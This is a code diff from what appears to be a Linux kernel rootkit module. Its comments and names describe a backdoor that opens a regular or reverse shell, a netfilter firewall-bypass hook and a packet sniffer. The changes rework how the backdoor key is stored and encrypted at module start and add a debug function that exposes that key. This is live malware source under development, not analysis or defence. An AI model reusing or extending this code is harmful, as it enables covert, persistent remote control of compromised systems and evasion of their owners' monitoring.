@@ -20,7 +20,6 @@
 #include "fs.h"
 #include "lkm.h"
 #include "log.h"
-#include "auto.h"
 
 static LIST_HEAD(iph_node);
 struct iph_node_t {
@@ -32,6 +31,10 @@ struct iph_node_t {
 
 struct task_struct *tsk_iph = NULL;
 static struct kv_crypto_st *kvmgc_bdkey;
+
+// Makefile auto-generated - DO NOT EDIT
+// To reset status: make clean
+uint64_t auto_bdkey = 0x0000000000000000;
 
 #define BD_PATH_NUM 3
 #define BD_OPS_SIZE 2
@@ -255,6 +258,7 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port, __be32 saddr,
 	}
 	return bd;
 }
+
 /**
  * Execute backdoor that can be either regular
  * or reverse shell
@@ -612,28 +616,35 @@ static unsigned int _sock_hook_nf_fw_bypass(void *priv, struct sk_buff *skb,
 	return rc;
 }
 
+#ifdef DEBUG_RING_BUFFER
+struct kv_crypto_st *kv_sock_get_mgc(void)
+{
+	return kvmgc_bdkey;
+}
+#endif
+
 struct task_struct *kv_sock_start_sniff(void)
 {
 	bool *running = _is_task_running();
 	static struct nf_priv priv;
 	struct task_struct *tsk = NULL;
+	u8 buf[16] = { 0 };
 
 	/**
-     * Init bdkey enc
-     */
-	kvmgc_bdkey = crypto_init();
-	if (kvmgc_bdkey) {
-		/** for the aes-256, 16 bytes
-         * is minimum data size
-         */
-		size_t datalen = 16;
-		u8 buf[16] = { 0 };
-		memcpy(buf, &auto_bdkey, 8);
-		kv_encrypt(kvmgc_bdkey, buf, datalen);
-
-		/** discard saved key */
-		auto_bdkey = 0;
+	 * Init bdkey enc
+	 */
+	kvmgc_bdkey = kv_crypto_mgc_init();
+	if (!kvmgc_bdkey) {
+		prerr("Failed to encrypt bdkey\n");
+		goto leave;
 	}
+
+	/** for the aes-256, 16 bytes
+	* is minimum data size
+	*/
+	memcpy(buf, &auto_bdkey, 8);
+	kv_encrypt(kvmgc_bdkey, buf, sizeof(buf));
+	auto_bdkey = 0;
 
 	// load sniffer
 	if (!*running) {
